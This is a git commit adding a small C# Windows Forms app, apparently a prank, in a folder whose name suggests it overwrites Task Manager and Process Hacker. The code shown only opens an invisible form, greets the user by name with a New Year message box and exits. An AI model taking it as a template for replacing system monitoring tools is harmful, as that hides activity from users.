312f3bedf6e12c4803ee3179de49091c876afd1e
GlebYoutuber <73891760+GlebYoutuber@users.noreply.github.com>
2021-12-29 12:55:20 +0200

    Add files via upload

---
+++ sourcecode/overwritetaskmgrandprochacker/Happy2022.Designer.cs
@@ -0,0 +1,55 @@
+﻿
+namespace Happy2022
+{
+    partial class Happy2022
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.SuspendLayout();
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(148, 123);
+            this.Cursor = System.Windows.Forms.Cursors.Default;
+            this.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Name = "Form1";
+            this.Opacity = 0.01D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "Form1";
+            this.TransparencyKey = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(64)))), ((int)(((byte)(0)))));
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+    }
+}
+
---
+++ sourcecode/overwritetaskmgrandprochacker/Happy2022.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Happy2022
+{
+    public partial class Happy2022 : Form
+    {
+        public Happy2022()
+        {
+            MessageBox.Show($"Are U Happy, {Environment.UserName}???" + Environment.NewLine + "Because IT'S NEW YEAR!!! :D" + Environment.NewLine + "Seriously...", "Happy 2022!!!", MessageBoxButtons.OK, MessageBoxIcon.Question);
+            Environment.Exit(-554);
+            InitializeComponent();
+        }
+    }
+}
